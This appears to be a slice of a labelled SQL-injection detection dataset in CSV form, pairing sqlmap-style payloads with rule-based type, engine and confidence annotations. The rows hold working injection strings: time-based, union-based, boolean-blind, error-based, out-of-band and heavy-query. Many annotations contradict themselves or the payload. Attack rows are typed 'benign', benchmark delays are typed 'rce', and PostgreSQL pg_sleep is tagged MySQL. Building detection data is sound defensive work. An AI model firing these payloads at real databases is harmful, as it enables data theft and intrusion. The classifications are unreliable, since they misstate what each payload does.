row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4980,1%' ) ) ) rlike sleep ( 5 ) and ( ( ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4981,select case when 6555 = 7349 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4982,"1 where 4448 = 4448 union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4983,1'|| ( select 'hafu' where 6226 = 6226,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4984,1'+ ( select mfcd where 6757 = 6757 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) +',1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
4985,1' ) where 2852 = 2852,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4986,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
4987,select ( case when ( 1898 = 4705 ) then 1898 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4988,1 ) ) as svhd where 9761 = 9761,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4989,"-1868 ) ) union all select 1859,1859--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4990,"1 ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
4991,"1"" ) rlike ( select ( case when ( 8732 = 6244 ) then 1 else 0x28 end ) ) and ( ""unuk"" = ""unuk",1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
4992,"1"" ) ) or sleep ( 5 ) and ( ( ""mcyv"" = ""mcyv",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4993,1'|| ( select 'agng' from dual where 3337 = 3337 rlike sleep ( 5 ) ) ||',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4994,"-3270"" where 2144 = 2144 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,,boolean_blind,generic,0.95,2144 = 2144 or detected — boolean_blind injection (priority 8) on generic,rule-based
4995,-9700' ) or 8811 = 7862,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4996,"1 ) as wbcd where 9506 = 9506 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4997,"1' ) as bagi where 1281 = 1281 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4998,1 ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 7594 = 7594,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
4999,"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""rsru"" = ""rsru",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5000,"1"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,,rce,generic,0.95,0x6d457153 detected — rce injection (priority 1) on generic,rule-based
5001,"1' where 9961 = 9961 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
5002,1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'yvxg' = 'yvxg,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
5003,1%' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and '%' = ',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5004,"-3420 where 9681 = 9681 or make_set ( 2438 = 1977,1977 ) --",1,,boolean_blind,generic,0.95,9681 = 9681 or detected — boolean_blind injection (priority 8) on generic,rule-based
5005,1' ) ) as vrwr where 3830 = 3830,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5006,"1"" ) where 1833 = 1833",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5007,"1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
5008,"1%"" ) and make_set ( 8403 = 8403,8899 ) and ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5009,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and 'uqyt' = 'uqyt",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
